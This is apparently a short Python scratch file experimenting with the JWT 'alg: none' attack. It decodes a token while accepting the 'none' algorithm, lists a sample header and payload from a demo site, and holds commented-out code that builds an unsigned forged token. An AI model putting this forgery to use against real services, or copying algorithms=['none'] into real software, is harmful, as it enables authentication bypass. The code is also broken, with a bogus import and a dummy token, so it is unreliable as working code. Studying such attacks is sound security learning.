import jwt
import algorithms

encoded = 'sds'
jwt.decode(encoded, 'secret', algorithms=['none'])
import jwt
import base64



# header
# eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
# {"typ":"JWT","alg":"HS256"}
#payload eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTUwNDAwNjQzNSwiZXhwIjoxNTA0MDA2NTU1LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0
# {"iss":"http:\/\/demo.sjoerdlangkemper.nl\/","iat":1504006435,"exp":1504006555,"data":{"hello":"world"}}
# def b64urlencode(data):
# #     return base64.b64encode(data).replace('+', '-').replace('/', '_').replace('=', '')
# #
# # print b64urlencode("{\"typ\":\"JWT\",\"alg\":\"none\"}") + \
# #     '.' + b64urlencode("{\"data\":\"test\"}") + '.'